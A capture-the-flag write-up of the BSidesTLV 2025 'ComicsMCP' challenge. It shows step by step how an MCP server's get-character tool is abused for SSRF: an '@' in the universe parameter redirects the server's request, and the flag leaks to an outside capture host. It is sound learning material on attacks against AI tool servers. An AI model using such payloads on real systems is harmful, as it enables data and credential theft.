# BSidesTLV 2025 - ComicsMCP: SSRF via MCP Universe Parameter

The challenge exposes an MCP server. After navigating to the URL, the first step is to establish a session by sending the MCP initialization request, which returns an `mcp-session-id` header to use in subsequent calls.

## Enumerating Tools

A `tools/list` call reveals a `get-character` tool that accepts two parameters: `universe` and `name`. A normal call looks like:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "get-character",
    "arguments": {
      "universe": "marvel",
      "name": "hulk"
    }
  }
}
```

## Finding the SSRF

Sending `/` as the `universe` value produces an error that leaks the URL the server constructs:

```
HTTPConnectionPool(host='bstlv25-', port=80): Max retries exceeded with url: /.chals.io/hulk
```

The server builds requests to `bstlv25-{universe}.chals.io/{name}`. We fully control both the hostname and path.

## Exploiting SSRF via URL Credential Syntax

By using the `@` character in the `universe` parameter, we make the server treat the beginning of the constructed URL as a username, turning the rest into the actual hostname. This redirects the outbound request to our controlled server:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "get-character",
    "arguments": {
      "universe": "@ctfctf.free.beeceptor.com/",
      "name": ""
    }
  }
}
```

The server sends an HTTP request to `ctfctf.free.beeceptor.com`, and the flag arrives in the request headers captured by the intercepting service. 
